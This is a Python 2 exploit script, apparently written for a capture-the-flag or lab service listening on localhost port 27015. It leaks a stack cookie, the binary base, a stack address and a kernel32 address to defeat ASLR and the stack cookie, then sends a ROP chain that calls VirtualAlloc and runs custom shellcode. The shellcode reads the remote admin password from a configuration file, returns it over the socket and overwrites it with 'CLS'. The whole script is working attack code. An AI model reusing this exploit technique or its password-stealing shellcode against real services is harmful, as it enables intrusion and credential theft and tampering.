import socket, struct, binascii, array, time
from nutshell import *

p = lambda x : struct.pack ("<L", x)
u = lambda x : struct.unpack ("<I", x)
signedHex = lambda val, nbits : hex ( (val + (1 << nbits)) % (1 << nbits) )

def littleE2Hex (x):
	val = binascii.unhexlify (x.encode ("hex") )
	y = array.array ('h', val)
	y.byteswap ()
	return u (val)[0]

VAlloc_offset = {"d8d7" : 0x156df, "dfa3" : 0xe547}

user = "pepe choto\x00"
s = socket.create_connection ( ("127.0.0.1", 27015) )
s.send (user)

cookie1 = s.recv (15)[:4]
print "[*] cookie: 0x%04x " % littleE2Hex (cookie1)
s.send ( cookie1 + p (0x0) + p (0xffffffc8) )

bin_base = littleE2Hex (s.recv(15))
print "[*] leaked binary returned address 0x%08x " % bin_base
bin_base &= 0xfff0000
print "[*] leaked binary base address : 0x%08x " % bin_base
s.send (cookie1 + p (0x0) + p (0xffffffb8) )

stack_leak = littleE2Hex (s.recv(15))
print "[*] leaked stack address @ 0x%08x" % stack_leak
stack_leak += 4
print "[*] predicted location of esp 0x%08x" % stack_leak
stack_leak += 44
print "[*] predicted location of cookie address in stack 0x%08x" % stack_leak

if ( bin_base + 0x3000 ) > stack_leak:
		k32_offset = p( (bin_base + 0x3000) - stack_leak )
else:
		k32_offset = p( int( signedHex( (bin_base + 0x3000) - stack_leak , 32 )[:-1] , 16) )

print "[*] Offset found of GetPrivateProfileSectionA from imports 0x%s " % littleE2Hex (k32_offset)
s.send (cookie1 + p (0x0) + k32_offset)

GetPrivProSect = littleE2Hex (s.recv(15))
print "[*] Virtual address of GetPrivateProfileSectionA leaked 0x%08x" % GetPrivProSect
virtual_alloc = GetPrivProSect + VAlloc_offset [ hex (GetPrivProSect)[6:] ]
print "[*] VirtualAlloc offset : 0x%08x --> VA @ 0x%08x" % (VAlloc_offset [hex (GetPrivProSect)[6:] ] , virtual_alloc)
s.send (cookie1 + p(0x0) + p(0xffffffd4))
datavar = bin_base + 0x4035

egg = Nutshell("x86", 0)

shellcode = "\x90" * 19
shellcode += egg.nut_asm("mov eax, %s" % hex(GetPrivProSect) ) 		# 	GetprivateProfileStringA
shellcode += egg.nut_asm("push %s" % hex(bin_base + 0x316c))
shellcode += egg.nut_asm("push 0x14")
shellcode += egg.nut_asm("push %s" % hex(bin_base + 0x4035))
shellcode += egg.nut_asm("push %s" % hex(bin_base + 0x317c))
shellcode += egg.nut_asm("push %s" % hex(bin_base + 0x3184))
shellcode += egg.nut_asm("push %s" % hex(bin_base + 0x318c))
shellcode += egg.nut_asm("call eax")

shellcode += egg.nut_asm("mov eax, [%s]" % hex(bin_base + 0x3064))  #  socket
shellcode += egg.nut_asm("xor ebx, ebx; push ebx")
shellcode += egg.nut_asm("push 0xf")
shellcode += egg.nut_asm("push %s" % hex(bin_base + 0x4035))
shellcode += egg.nut_asm("push 0x58")
shellcode += egg.nut_asm("call eax")

shellcode += "\x90"*8
shellcode += egg.nut_resolve("eax", "WritePrivateProfileStringA", 0)  # writePrivateProfileA
shellcode += egg.nut_asm("push 0x534c43")
shellcode += egg.nut_asm("mov ebx, [esp]")
shellcode += egg.nut_asm("mov [%s], ebx" % hex(bin_base + 0x4040))
shellcode += egg.nut_asm("push %s" % hex(bin_base + 0x316c))
shellcode += egg.nut_asm("push %s" % hex(bin_base + 0x4040))
shellcode += egg.nut_asm("push %s" % hex(bin_base + 0x3184))
shellcode += egg.nut_asm("push %s" % hex(bin_base + 0x318c))
shellcode += egg.nut_asm("call eax")

shellcode += egg.nut_resolve("eax", "ExitProcess", 0)			 	 # ExitProcess
shellcode += egg.nut_asm("xor ebx, ebx")
shellcode += egg.nut_asm("push ebx")
shellcode += egg.nut_asm("call eax")

rop =  p (bin_base + 0x1045)*10  		#  ret sled
rop += p (virtual_alloc)     	 		#  valoc
rop += p (bin_base + 0x1045)			#  ret
rop += p (stack_leak + 1600)			#  addr
rop += p (0x0001)						#  size
rop += p (0x1000)						#  allocation type
rop += p (0x40)			    			#  buffer of returned string
rop += p (stack_leak + 1600)			#  shellocde pivot
rop += shellcode					

addr_info = littleE2Hex(s.recv(15))
print "[+] received address of addr_info 0x%s" % addr_info	
dat = cookie1 + p (len (cookie1 + rop) ) + p (0x208) 
print "[+] sending: %s" % dat.encode ("hex")
s.send (dat)

s.recv (15)
s.send (cookie1 + rop)

print "[*] Overwritting ret with payload of %d bytes" % len (cookie1 + rop)
s.recv (512)
s.send (p (0xdeadc0de) )

old_pass = s.recv(512)
print "[*] admin password in remote machine is: %s" % old_pass
print "[+]  Overwritting admin password to 'CLS'"